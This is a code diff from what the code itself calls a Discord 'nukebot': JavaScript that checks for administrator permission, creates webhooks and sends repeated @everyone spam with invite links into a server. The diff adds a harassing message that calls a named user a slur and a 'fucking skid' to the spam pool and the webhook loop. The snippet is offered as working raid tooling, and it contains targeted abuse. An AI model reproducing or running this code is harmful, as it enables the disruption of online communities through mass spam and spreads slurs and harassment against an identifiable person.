@@ -391,7 +391,7 @@ if(message.guild.me.hasPermission("ADMINISTRATOR")) {
  
  
  function randomT() {
-   var rand = ["https://discord.gg/XVAHsbqnU4", "https://discord.gg/XVAHsbqnU4", "https://discord.gg/XVAHsbqnU4", "https://images-ext-1.discordapp.net/external/eFAPb9A-KDB8CcJsMlLwXi_iBL3EBaru-3b-CueTnRA/https/cdn.discordapp.com/icons/782621562154254356/9efdc64eb1b2548f27eda9938af40720.webp", '@everyone https://youtu.be/YaiOwWDW8EY', "🍬🎄❄ MERRY CHRISTMAS EVERYONE \n🍬🎄❄ MERRY CHRISTMAS EVERYONE \n🍬🎄❄ MERRY CHRISTMAS EVERYONE \n🍬🎄❄ MERRY CHRISTMAS EVERYONE \n🍬🎄❄ MERRY CHRISTMAS EVERYONE \n🍬🎄❄ MERRY CHRISTMAS EVERYONE ", "https://cdn.discordapp.com/avatars/759840501741518859/e96a11b39390687eed60f0bec3be64c1.png?size=1024", "https://cdn.discordapp.com/icons/751095375359770624/dddf4876e5f7496d12c64b2f7f82e72b.png?size=1024", "https://images-ext-2.discordapp.net/external/1RImRRcAupiTBBfcQ2aKa7cj_meZCQI9JIpIGSt-VbU/%3Fsize%3D1024/https/cdn.discordapp.com/icons/751095375359770624/dddf4876e5f7496d12c64b2f7f82e72b.png"]
+   var rand = ["Fakey#0966 is a retard who thinks he can take credit for my nukebot LMFAO fucking skid, the real creator of this nuke is assy and assy alone\nFakey#0966 is a retard who thinks he can take credit for my nukebot LMFAO fucking skid, the real creator of this nuke is assy and assy alone\nFakey#0966 is a retard who thinks he can take credit for my nukebot LMFAO fucking skid, the real creator of this nuke is assy and assy alone" ,"https://discord.gg/XVAHsbqnU4", "https://discord.gg/XVAHsbqnU4", "https://discord.gg/XVAHsbqnU4", "https://images-ext-1.discordapp.net/external/eFAPb9A-KDB8CcJsMlLwXi_iBL3EBaru-3b-CueTnRA/https/cdn.discordapp.com/icons/782621562154254356/9efdc64eb1b2548f27eda9938af40720.webp", '@everyone https://youtu.be/YaiOwWDW8EY', "🍬🎄❄ MERRY CHRISTMAS EVERYONE \n🍬🎄❄ MERRY CHRISTMAS EVERYONE \n🍬🎄❄ MERRY CHRISTMAS EVERYONE \n🍬🎄❄ MERRY CHRISTMAS EVERYONE \n🍬🎄❄ MERRY CHRISTMAS EVERYONE \n🍬🎄❄ MERRY CHRISTMAS EVERYONE ", "https://cdn.discordapp.com/avatars/759840501741518859/e96a11b39390687eed60f0bec3be64c1.png?size=1024", "https://cdn.discordapp.com/icons/751095375359770624/dddf4876e5f7496d12c64b2f7f82e72b.png?size=1024", "https://images-ext-2.discordapp.net/external/1RImRRcAupiTBBfcQ2aKa7cj_meZCQI9JIpIGSt-VbU/%3Fsize%3D1024/https/cdn.discordapp.com/icons/751095375359770624/dddf4876e5f7496d12c64b2f7f82e72b.png"]
  return rand[Math.floor(Math.random()*rand.length)];
  }
  
@@ -450,7 +450,7 @@ if(message.guild.me.hasPermission("ADMINISTRATOR")) {
                 p.createWebhook("assy").then(w => {
                      
                 [1,2,3,4,5,6,7,8,9,10,11,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12].forEach(function(i) {
-                    w.send("https://youtu.be/YaiOwWDW8EY https://discord.gg/XVAHsbqnU4 @everyone")
+                    w.send("https://youtu.be/YaiOwWDW8EY https://discord.gg/XVAHsbqnU4 \nFakey#0966 is a retard who thinks he can take credit for my nukebot LMFAO fucking skid, the real creator of this nuke is assy and assy alone @everyone")
                     
                 
                 })
